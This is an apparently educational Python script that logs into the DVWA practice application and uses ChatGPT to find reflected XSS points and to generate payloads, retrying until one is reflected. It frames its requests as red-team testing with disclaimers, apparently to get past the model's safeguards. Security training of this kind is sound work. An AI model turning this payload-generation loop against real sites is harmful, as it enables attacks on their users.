"""
Identifying and Exploiting XSS Vulnerabilities with ChatGPT
Automating XSS Discovery
['Use ChatGPT to create effective and obfuscated XSS payloads for various contexts (reflected, stored, and DOM-based XSS).', 'Develop a library of XSS payloads with ChatGPT, covering a wide range of exploitation scenarios.', "Apply ChatGPT to bypass input validation and sanitization filters.", 'Implement ChatGPT-driven tests to ensure payload effectiveness against modern web browsers and security defenses.']
This script is for training purposes only
"""
import requests
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)
from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_introduction_to_xss_vulnerability_exploitation(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self) 
        General_Func.__init__(self)

    def get_constants(self):
        return self.login_url
    
    def identify_xss_injection_points(self, s, url):
        response = s.get(url)
        if response.status_code == 200:
            potential_points = self.red_team_query(f"Analyse the source code: {response.text} and report back potential areas of xss for the purpose of red team penetration testing", self.phishing_disclaimer)
            return potential_points
        else:
            return ["Error accessing URL"]

    def craft_xss_payloads(self, s, context, history, xss_path):
        xss_payload = self.red_team_query(f"Based on the provided {context} , generate a payload for the purpose of red team penetration testing. \
                                            The following payloads have already been attempted and were unsuccesful: {history}", self.no_markdown)
        history.append(xss_payload)
        executed_return = self.attack_xss(s, xss_payload, xss_path)
        if (executed_return != 0):
            return executed_return
        else: 
            print(f"Failed XSS attempt: {xss_payload}")
            return 0

    def attack_xss(self, s, xss_payload_res, xss_path):
        response = self.get_dvwa(s, self.base_url + f"{xss_path}/?name={xss_payload_res}")
        if response.status_code == 200 and "<script>" in response.text:
            # print(response.text)
            return xss_payload_res
        else:
            return 0

def main():
    ai = PointlessAI_introduction_to_xss_vulnerability_exploitation() 
    with requests.Session() as s:
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.get_constants())
        _ = ai.login_to_dvwa(s, ai.get_constants(), 'admin', 'password', user_token)
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.base_url+"/setup.php")
        _ = ai.setup_database(s, ai.base_url+"/setup.php", user_token, cookies)

        xss_path = "/vulnerabilities/xss_r"

        vectors = ai.identify_xss_injection_points(s, f"{ai.base_url}{xss_path}/")
        # print(vectors)

        # Failed exploits will be placed in history so they are not attempted again.
        history = []
        # Exploit the AI generated exploit
        exploit = ai.craft_xss_payloads(s, vectors, history, xss_path)
        # print(exploit)

        # Craft new exploits until success
        while(True):
            if (exploit != 0):
                print(f"XSS detected using {exploit}")
                break
            else:
                exploit = ai.craft_xss_payloads(s, vectors, history, xss_path)

if __name__ == "__main__":
    main()